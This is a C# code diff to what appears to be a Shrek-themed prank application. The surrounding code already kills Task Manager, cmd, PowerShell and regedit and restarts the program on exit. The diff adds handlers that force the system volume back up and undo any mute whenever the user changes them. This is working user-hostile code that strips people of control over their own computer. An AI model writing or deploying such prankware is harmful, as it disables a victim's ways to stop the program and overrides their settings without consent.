@@ -25,6 +25,9 @@ public partial class App : Application
 
     public const bool DoKillDisallowedProcesses = true; // Kill task manager, cmd, etc...
     private static readonly string[] DisallowedProcesses = [ "Taskmgr", "Cmd", "Powershell", "regedit" ];
+
+    public const bool DoPreventVolumeChanges = true; // Stop the user from lowering the volume
+    private readonly VolumeWatcher _volumeWatcher =  new();
     
     protected override void OnStartup(StartupEventArgs e)
     {
@@ -61,6 +64,15 @@ public partial class App : Application
         // Monitor and kill disallowed processes
         if (DoKillDisallowedProcesses)
         { _ = RunProcessKillerAsync(); }
+        
+        // Stop the user from lowering the volume
+        if (DoPreventVolumeChanges)
+        {
+            _volumeWatcher.MasterVolumeChange += MasterVolumeChanged;
+            _volumeWatcher.AppVolumeChange += AppVolumeChanged;
+            _volumeWatcher.MasterMuteChange += MasterMuteChanged;
+            _volumeWatcher.AppMuteChange += AppMuteChanged;
+        }
     }
     
     // Kill-switch
@@ -183,6 +195,37 @@ public partial class App : Application
             catch (Exception e)
             { Console.WriteLine($"Could not kill process \"{candidateProcess.ProcessName}\" ({candidateProcess.Id}): {e}"); }
         }
+    }
+    
+    // Volume logic
+
+    private void MasterVolumeChanged(float newVolume)
+    {
+        if (newVolume > 0.25) return;
+        
+        Console.WriteLine("Volume is too low! User is unable to appreciate Shrek's voice.");
+        _volumeWatcher.SetMasterVolume(0.25f);
+    }
+
+    private void AppVolumeChanged(float newVolume)
+    {
+        if (newVolume >= 1) return;
+        _volumeWatcher.SetAppVolume(1);
+    }
+
+    private void MasterMuteChanged(bool mute)
+    {
+        if (mute)
+        {
+            Console.WriteLine("Please don't mute me :(");
+            _volumeWatcher.SetMasterMute(false);
+        }
+    }
+
+    private void AppMuteChanged(bool mute)
+    {
+        if (!mute) return;
+        _volumeWatcher.SetAppMute(false);
     }
 
     // On graceful exit, just restart
